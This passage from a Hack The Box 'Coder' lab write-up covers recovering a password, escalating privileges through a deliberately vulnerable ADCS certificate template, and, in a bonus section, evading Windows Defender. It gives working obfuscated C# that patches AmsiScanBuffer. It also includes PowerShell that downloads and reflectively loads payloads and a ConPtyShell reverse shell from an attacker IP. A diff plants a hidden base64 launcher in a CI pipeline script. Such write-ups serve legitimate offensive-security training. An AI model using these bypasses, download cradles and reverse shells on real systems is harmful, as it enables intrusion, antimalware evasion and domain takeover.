`> $key = (144,255,52,33,65,190,44,106,131,60,175,129,127,179,69,28,241,70,183,53,153,196,10,126,108,164,172,142,119,112,20,122)`

Almost the same process for `enc.txt`

`$ echo -n '<copied enc.txt>' | sed 's/^\+//g' | tr -d '\n'`

`> $enc = "76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA=="`

Now let's get our PSCredential

`> $pass = ConvertTo-SecureString -String $enc -Key $key`

`> $cred = New-Object System.Management.Automation.PSCredential("coder\e.black", $pass`

Now we have what we need for the clear text password

![](Images/Pasted%20image%2020231222073821.png)

![](Images/Pasted%20image%2020231222074225.png)


## Privilege Escalation

Now that we have access to a member of the PKI Admins group, let's see what we can do with ADCS. I opted to use the Certipy tool. An initial search for vulnerable templates returned nothing:

`certipy find -json -vulnerable -dc-ip 10.10.11.207 -ns 10.10.11.207 -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300`
![](Images/Pasted%20image%2020231222214310.png)

Let's instead search through all templates and see if the PKI Admins group has any permissions over any of the templates. If we have any write permissions, we can modify a template to be vulnerable. We can use the same command as above but remove the `-vulnerable` flag.

Certipy returned 33 templates. Using jq, we can list permissions for all templates.

`cat <json file> | jq '."Certificate Templates"[].Permissions."Object Control Permissions"'`

Only `Enterprise Admins`, `Domain Admins`, and `Administrator` have any object control permissions over any of the templates.

![](Images/Pasted%20image%2020231222225836.png)

The description for `PKI Admins` is "ADCS Certificate and Template Management", so we have to have some control. Let's check permissions on the Certificate Template Configuration container. We'll use bloodyAD for that.

`bloodyAD -d coder.htb -u e.black -p ypOSJXPqlDOxxbQSfEERy300 --host dc01.coder.htb get object --resolve-sd 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=coder,DC=htb'`

```ruby
distinguishedName: CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=coder,DC=htb
cn: Certificate Templates
dSCorePropagationData: 2022-06-30 05:03:11+00:00; 1601-01-01 00:00:00+00:00
instanceType: 4
nTSecurityDescriptor.Owner: Enterprise Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.0.Trustee: PKI Admins
nTSecurityDescriptor.ACL.0.Right: GENERIC_WRITE|READ_PROP|LIST_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.1.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.1.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.2.Trustee: AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.2.Right: GENERIC_READ
nTSecurityDescriptor.ACL.2.ObjectType: Self
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: LOCAL_SYSTEM
nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: Domain Admins
nTSecurityDescriptor.ACL.5.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT; INHERITED
name: Certificate Templates
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=coder,DC=htb
objectClass: top; container
objectGUID: {cd31cef2-1e3b-4522-9375-cfaffe9886fb}
showInAdvancedViewOnly: True
uSNChanged: 16407
uSNCreated: 4133
whenChanged: 2022-06-30 05:03:11+00:00
whenCreated: 2022-06-29 03:50:28+00:00
```

Looking at the output above, `PKI Admins` has GENERIC_WRITE and CREATE_CHILD permissions. We have the permissions to create templates. We can create a vulnerable template.

After some research online, I stumbled onto the github page for ADCSTemplate:

![](Images/Pasted%20image%2020231223080422.png)
![](Images/Pasted%20image%2020231223080549.png)

This should allow us to do what we need to do. To use the module, we will utilize Evil-WinRM. Evil-WinRM has built in capabilities to remotely import powershell scripts. To do so, when running your Evil-WinRM command, use the `-s` flag to specify the directory your PowerShell script is in.

`evil-winrm -s . -i 10.10.11.207 -u e.black -p ypOSJXPqlDOxxbQSfEERy300`

Once connected, to access the script you just have to type it's name in the prompt. You can then type `menu` to see your new imported commands.

![](Images/Pasted%20image%2020231223081155.png)

The `New-ADCSTemplate` cmdlet creates a new template based on JSON input. There is a lot to configure with these templates. The easiest way create a vulnerable template would be to use the `Export-ADCSTemplate` cmdlet to output another template into JSON and change the values we want to make it vulnerable to ESC1. We can then run `New-ADCSTemplate` on our modified JSON to create and publish the vulnerable template. We can then exploit the template with Certipy.

For the export, I decided to go with the `User` template. Any template should work as we will be modifying the template regardless. We'll export the template into a variable so we can modify the fields within powershell.

`$tmplt = Export-ADCSTemplate -DisplayName User | ConvertFrom-Json`

HackTricks on their ADCS Domain Escalation page has a list of what must be set for a template to be vulnerable to ESC1.

![](Images/Pasted%20image%2020231223084552.png)

Looking at our Certipy output from earlier again, the only thing the User template doesn't have for ESC1 is the `CT_FLAG_ENROLLE_SUPPLIES_SUBJECT` flag

![](Images/Pasted%20image%2020231223085308.png)

This flag is set in the `mspki-certificate-name-flag` property. Our exported template has this property set to `-1509949440`

![](Images/Pasted%20image%2020231223225752.png)

Let's figure out what we have to set it to. I found official documentation on the `msPKI-Certificate-Name-Flag` attribute on the official Microsoft website.

![](Images/Pasted%20image%2020231223230023.png)

The flag for `CT_FLAG_ENROLLEE_SUPPLIE_SUBJECT` above is just 1 in decimal. Let's update the attribute in our PowerShell variable.

![](Images/Pasted%20image%2020231223230441.png)

We should have everything we need to create our new template. For simplicity, we'll create it under the name User2.

`New-ADCSTemplate -JSON (ConvertTo-Json $tmplt) -DisplayName User2 -Identity 'coder\e.black' -Publish`
![](Images/Pasted%20image%2020231223231059.png)

Now let's check Certipy again to see if it can find our vulnerable template.

![](Images/Pasted%20image%2020231223231412.png)
![](Images/Pasted%20image%2020231223231522.png)

Success! Now let's use Certipy to exploit it.

`certipy req -ca coder-dc01-ca -template User2 -upn administrator@coder.htb -dc-ip 10.10.11.207 -ns 10.10.11.207 -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300`
![](Images/Pasted%20image%2020231224071338.png)
 We can the use Certipy to authenticate to the DC with the generated pfx certificate.

`certipy auth -pfx administrator.pfx -dc-ip 10.10.11.207 -ns 10.10.11.207 -domain coder.htb`
![](Images/Pasted%20image%2020231224072202.png)
`cme smb dc01.coder.htb -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7 -x whoami`
![](Images/Pasted%20image%2020231224072431.png)
![](Images/Pasted%20image%2020231224072830.png)

We are given a TGT ccache file and the NTLM hash for the Administrator user. We are able to use either to authenticate as Administrator. You can grab root.txt however you wish. User.txt is in the `e.black` user directory. The Insane machine Coder has been Pwned!


## Bonus - AMSI Bypass

As promised, this section will be about getting ConPtyShell to bypass Windows Defender. Earlier I mentioned about the differences between ConPtyShell and the much simpler, modified Nishang one-liner we used when we first went through the machine. ConPtyShell provides a fully interactive reverse shell complete with tab autocompletion, command history, ability to use Ctrl+C without killing your shell, and proper error display. These are all things the simple Nishang shell lack.

In addition to providing us a fully interactive shell, bypassing Defender the way we are about to go into will have additional benefits that will allow us to enumerate the machine and tackle the privilege escalation in slightly different ways. These benefits aren't tied directly to ConPtyShell, but to the way we will bypass AMSI to use ConPtyShell. If you wanted, you could use the technique with the Nishang shell or even Evil-WinRM to reap the same benefits. This will all make more sense as we talk about the bypass.

## What is AMSI?

Before we talk about bypassing AMSI, we should talk a little about what AMSI is. *Antimalware Scan Interface*. It is Microsoft's vendor-agnostic answer to the difficulties Defender and other traditional AntiVirus (AV) solutions had in detecting fileless attacks. Before AMSI, Defender would scan files on disk looking for malicious signatures. Scripting languages (such as PowerShell, JavaScript, Python, and Perl) executing scripts not written to disk, and .NET assemblies loaded into memory had high success rates with bypassing this type of detection. AMSI is able to capture scripts before they are passed to the scripting engine for execution and checks them against Defender before allowing execution to continue. .NET is also able use AMSI to do this for assemblies loaded into memory. This gives Defender a much greater ability to identify and flag on signatures from scripts and other in-memory execution it otherwise would have been unable to detect.
## How does AMSI Work?

![](Images/Pasted%20image%2020231230235344.png)

To further help us understand bypassing AMSI, let's also briefly get a quick overview on how AMSI works. The picture above is provided by Microsoft documentation on their website and illustrated AMSI's architecture. To explain this image a little bit, AMSI acts as a bridge, connecting various applications to a desired AV provider through the AMSI interface. To access this interface, the application loads `AMSI.dll` into memory. This DLL file hosts a number of functions the application can use to utilize AMSI. If you look at he Win32API Layer in the picture above you should see two of these functions mentioned, `AmsiScanBuffer` and `AmsiScanString`. Two other important ones we will talk about are `AmsiInitialize` and `AmsiUninitialize`.

After loading `AMSI.dll` into the application's address space, the application will create an instance of the AMSI interface with `AmsiInitialize`. Afterwards, it will pass any input it wishes to be scanned to `AmsiScanBuffer` or `AmsiScanString`. AMSI will then pass the input to the AV provider for scanning and testing. `AmsiScanString` can be used for strictly string input. `AmsiScanBuffer` is more common and can be used for any input. If AV deems the input to be malicious, AMSI will return **AMSI_RESULT_DETECTED** and the application knows not to execute. If AV finds the input to be clean, the function returns **AMSI_RESULT_CLEAN** instead and execution can continue. Once the application no longer needs the AMSI interface, it will call `AmsiUninitialize` to remove the instance.

## Bypassing AMSI

Now that we know what AMSI is and how it works, we can go over how to bypass it. There are a lot of different AMSI bypass techniques. We will cover two.

#### AmsiInitFailed

The first method is a bypass for PowerShell that was discovered by Matt Graeber in 2016.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

This PowerShell command sets the `amsiInitFailed` value within the current PowerShell session to true. This basically tricks PowerShell into thinking it is unable to initialize AMSI. If it's unable to initialize AMSI, then there is no point in trying to send input to AMSI to be scanned, and PowerShell will just execute the script provided to it without using AMSI to test for any malicious signatures.

This simple command has since been signatured by Microsoft. Any attempt to run it as is will be flagged by Defender. However any number of obfuscation techniques can hide this signature. And once this command gets executed, there would be no need to obfuscate any more of your powershell commands as long as it's the same process.

###### AmsiInitFailed Shortcomings

As quick and simple as this bypass is, this is not what we will be using to get ConPtyShell running on this box. This is because this bypass is completely unable to work for ConPtyShell as is. We would still need to modify its signatures as if we didn't do the bypass at all. This is because of the limitations of bypass, as well as how ConPtyShell is scripted.

First let's go over the limitations of the bypass. The `amsiInitFailed` value that is changed exists within the `System.Management.Automation` namespace. This is PowerShell's namespace. As a result, this bypass affects PowerShell and only PowerShell. Any .NET assembly loaded into memory is still subject to AMSI as `AMSI.dll` was still successfully loaded into the process.

Now, why is this a problem for ConPtyShell when `Invoke-ConPtyShell.ps1` is a PowerShell script. That is because of how ConPtyShell's PowerShell script works.

```powershell
...

$parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
Add-Type -TypeDefinition $Source -Language CSharp;
$output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
Write-Output $output
}

$Source = @"

using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;

...
```

Above is a snippet from `Invoke-ConPtyShell.ps1`. The script uses Add-Type to dynamically compile the C# code stored in the `$Source` variable and load the resulting .NET Assembly into memory. As mentioned earlier, .Net assemblies loaded into memory are still subject to AV scanning through AMSI. ConPtyShell is very much signatured and the resulting compilation will definitely be flagged. Now, let's discuss our second bypass method that will remedy this problem.

#### Patching AmsiScanBuffer

This method was discovered by Rasta Mouse. Since the problem with the previous method comes from the fact that `AMSI.dll` still gets loaded, we will use this method to patch `AMSI.dll` itself, altering its functionality. If we can control the DLL itself, then anything ran under the context of the process that loaded the DLL can bypass AMSI.

If we recall the basic overview of how AMSI works, `AmsiInitialize` is called. Input is passed to `AmsiScanBuffer` to be tested against AV. `AmsiUninitialize` is called. What if we could modify `AmsiScanBuffer` so that it doesn't pass the input to AV, but instead simply return and allow execution to continue? Well we can

I recommend reading Rasta Mouse's blog post on the technique.

https://rastamouse.me/memory-patching-amsi-bypass/

He explains it in much better detail than I am about to. But basically, `AmsiScanBuffer` will check the parameters passed to it when it is called. If it finds any invalid arguments, it will simply return with an **E_INVALIDARG** error code (**0x80070057**) without passing the buffer input to be scanned. Since the input never gets scanned, it ultimately has a result of 0. 0 is the same value as **AMSI_RESULT_CLEAN**. Despite `AmsiScanBuffer` returning with an error, PowerShell and .NET will still look at the scan result and continue execution.

We can use WinAPI calls to patch `AmsiScanBuffer` and mimic this behavior.

```csharp
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    //Import necessary functions from "kernel32"

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect);


    public static void Bypass()
    {
        //Set Patch Opcode
        byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        //Load DLL and get address for patching
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

        //Make process writable for patching.
        UInt32 oldProtect = 0;
        VirtualProtect(amsiScanBuffer, (UInt32)patch.Length, 0x40, ref oldProtect);

        //Write patch
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

        //Return process to original protection
        UInt32 throwAwayVariable = 0;
        VirtualProtect(amsiScanBuffer, (UInt32)patch.Length, oldProtect, ref throwAwayVariable);
    }
```

The above code was written in C#. Let's break it down a little bit. We load `amsi.dll` into memory with the `LoadLibrary` function call. We than get the address to `AmsiScanBuffer` from within `amsi.dll` with the `GetProcAddress` function call. We then use the `VirtualProtect` function call to set the `AmsiScanBuffer` memory region to **0x40**, which is **EXECUTE_READWRITE**. We then copy the bytes set in the patch variable to overwrite the `AmsiScanBuffer` instructions. The patch bytes are opcode. Opcode is machine language instructions. Here is the equivalent instruction in x86 assembly.

```
mov eax,0x80070057
ret
```

This will cause `AmsiScanBuffer` to just return **0x80070057** or **E_INVALIDARG** and bypass the scanning. Once the patch is in place, we finish by calling `VirtualProtect` again to return the memory region to its original protection, **EXECUTE_READ**. Now `AmsiScanBuffer` will run without passing anything to Defender. We will be able to run almost anything we want within the context of the current process!

Now if we try to use this code as is. It's going to fail. A few things in here are signatured. Primarily, it's the strings `"amsi.dll"` and `"AmsiScanBuffer"`, as well as the opcode. We can simply change the opcode and obfuscate the strings. We'll make sure the variable names don't use amsi or patch as well just to be safe:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;

public class Amsi
{
    //Import necessary functions from "kernel32"

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect);


    public static void Bypass()
    {
        //De-Obfuscation
        byte[] aBytes = new byte[] { 0x59, 0x51, 0x42, 0x74, 0x41, 0x48, 0x4d, 0x41, 0x61, 0x51, 0x41, 0x75, 0x41, 0x47, 0x51, 0x41, 0x62, 0x41, 0x42, 0x73, 0x41, 0x41, 0x3d, 0x3d };
        byte[] bBytes = new byte[] { 0x51, 0x51, 0x42, 0x74, 0x41, 0x48, 0x4d, 0x41, 0x61, 0x51, 0x42, 0x54, 0x41, 0x47, 0x4d, 0x41, 0x59, 0x51, 0x42, 0x75, 0x41, 0x45, 0x49, 0x41, 0x64, 0x51, 0x42, 0x6d, 0x41, 0x47, 0x59, 0x41, 0x5a, 0x51, 0x42, 0x79, 0x41, 0x41, 0x3d, 0x3d };
        string aB64 = Encoding.ASCII.GetString(aBytes);
        string bB64 = Encoding.ASCII.GetString(bBytes);
        string dll = Encoding.Unicode.GetString(Convert.FromBase64String(aB64));
        string proc = Encoding.Unicode.GetString(Convert.FromBase64String(bB64));

        //Patch Opcode
        byte[] pBytes = new byte[] { 0xB8, 0x41, 0x40, 0x05, 0x60, 0x05, 0x16, 0xC0, 0x01, 0x20, 0xC3 };

        //Load DLL and get address for patching
        IntPtr aLibrary = LoadLibrary(dll);
        IntPtr bAddress = GetProcAddress(aLibrary, proc);

        //Make process writable for patching.
        UInt32 oldProtect = 0;
        VirtualProtect(bAddress, (UInt32)pBytes.Length, (UInt32)PAGE.READWRITE, ref oldProtect);

        //Write patch
        Marshal.Copy(pBytes, 0, bAddress, pBytes.Length);

        //Return process to original protection
        UInt32 throwAwayVariable = 0;
        VirtualProtect(bAddress, (UInt32)pBytes.Length, oldProtect, ref throwAwayVariable);
    }

    //Set enums

    public enum PAGE
    {
        READWRITE = 0x04
    }
}
```

This will be the final code we compile and use for our bypass. For obfuscation, I base64 encoded the strings then converted the base64 to hexadecimal. I reverse the process into the variables `dll` for `"amsi.dll"` and `proc` for `"AmsiScanBuffer"`. For the opcode, I changed the assembly to

```
mov eax,0x60054041
add eax,0x2001c016
ret
```

Instead of moving **0x80070057** directly to register **eax**, I instead moved a smaller number and added another number to reach **0x80070057**. You can use whatever set of assembly isntructions you want. So long as register **eax** has the necessary value once you call **ret**.

One more thing, in the original code I wrote, I set the memory region to **0x40** for **EXECUTE_READWRITE**. This is what's in Rasta Mouse's proof of concept. However I opted to instead use **READWRITE**, or **0x04**. Changing a memory region to **EXECUTE_READWRITE** is generally more noticeable than **READWRITE**. Although detection isn't something we need to worry about and avoiding it is a long in-depth discussion on its own, it's best to form good habits wherever we can. So we will change the memory region to **READWRITE**, then back to **EXECUTE_READ** after we are done patching.

## Using Our Bypass

Now that we have our bypass, time to start putting it into action. First, we're going to compile to code into a DLL. I used mono.

![](Images/Pasted%20image%2020240103215024.png)

Next. We'll start working on a powershell script to execute this DLL for us. The end goal is to use this script as diff patch to get command execution from the TeamCity server. We are going to recreate our initial access.

```powershell
$amsiAssembly = (New-Object System.Net.WebClient).DownloadData("http://10.10.14.8/Amsi.dll")
[System.Reflection.Assembly]::Load($amsiAssembly)
[Amsi]::Bypass()
IEX(IWR http://10.10.14.8/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 8443
```

We'll host the DLL on a webserver. Our script will download the the DLL and use Reflection to load it into memory. Once it's loaded, we execute the `Bypass` method from our code. Once that's done, we can call on Invoke-ConPtyShell again.

Now if we try to execute ConPtyShell, we are still going to get an error. Defender will flag on `Add-Type` in the script. But the AMSI bypass for sure worked. So why is that? Honestly, I don't have a solid answer on this one. I do have a couple of ideas though. `Add-Type` calls a compiler to compile the source code specified in the `$Source` variable of the `Invoke-ConPtyShell` script. The compiler probably runs under the context of its own process with its own `amsi.dll`. I haven't personally tested this myself to verify yet. Another possibility is that the source code gets written to a temporary file before compilation, and Defender flags on the code while it's on disk.

Regardless of the reason, the fix is simply to modify the ConPtyShell script to use Reflection instead of `Add-Type`. Using Reflection would both guarantee the shell gets run under the current process and that nothing is written to disk. The modification should be fairly straight forward. The github for ConPtyShell comes with the C# source code. Let's also compile it into a DLL and host it on our python webserver.

![](Images/Pasted%20image%2020240104162234.png)

Now, let's modify `Invoke-ConPtyShell.ps1` to use Reflection.

```powershell
#Original

...

$parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
Add-Type -TypeDefinition $Source -Language CSharp;
$output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
Write-Output $output
}

$Source = @"

...
```

```powershell
#Modified

$parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
$assemblyConPtyShell = (New-Object System.Net.WebClient).DownloadData("http://10.10.14.8/ConPtyShell.dll")
[System.Reflection.Assembly]::Load($assemblyConPtyShell)
$output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
Write-Output $output
```

I removed the source code from the script and replaced `Add-Type` with the necessary lines to download our compiled DLL and load it into memory. The rest of the script can stay as is.

Now, let's convert our earlier AMSI bypass script to Base64 to run it as a background process the same way we did with our Nishang shell when we were doing the box. We'll create a patch and execute it.

```diff
--- hello_world.ps1	2023-12-15 23:21:17.720538874 -0500
+++ hello_world.ps1	2024-01-04 16:41:40.160416316 -0500
@@ -1,2 +1 @@
-#Simple repo test for Teamcity pipeline
-write-host "Hello, World!"
+Start-Process powershell -ArgumentList '-nop -w hidden -exec bypass -enc JABhAHMAcwBlAG0AYgBsAHkAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA1AC8AQQBtAHMAaQAuAGQAbABsACIAKQAKAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAcwBzAGUAbQBiAGwAeQApAAoAWwBBAG0AcwBpAF0AOgA6AEIAeQBwAGEAcwBzACgAKQAKAEkARQBYACgASQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADUAIAA4ADQANAAzAAoA'
```
![](Images/Pasted%20image%2020240105003649.png)
![](Images/Pasted%20image%2020240105003732.png)

Success!

Now there are many other ways of achieving the same goal. I decided on this way to show off concepts such as simple uses of Reflection. Being able to execute .NET assembly entirely in memory without writing to disk is a very valuable technique with many use cases. This ties into what I was mentioning earlier about additional benefits to this bypass technique.

#### Additional Benefits

When we had gone through the box earlier, we had used Bloodhound.py and Certipy with python to enumerate and exploit ADCS remotely. The Windows equivalents to these tools, SharpHound and Certify, are easily flagged by Defender. Because of this, it made more sense to use remote tools so we didn't have to contend with Defender. Now that we have AMSI bypassed, we can use Reflection to load these tools into memory and use them on the box.

![](Images/Pasted%20image%2020240105005514.png)

I think I said earlier that the bypass would allow us to do a slightly different enumeration and privilege escalation path. Ultimately it's the same path, but we have the ability to use different tools.

Whether you decide to use Reflection to load a tool into memory, or use a different tool remotely, it's all dependent on the situation, your goals, and what your preferences are. Expirement around and find more fun ways to pwn machines!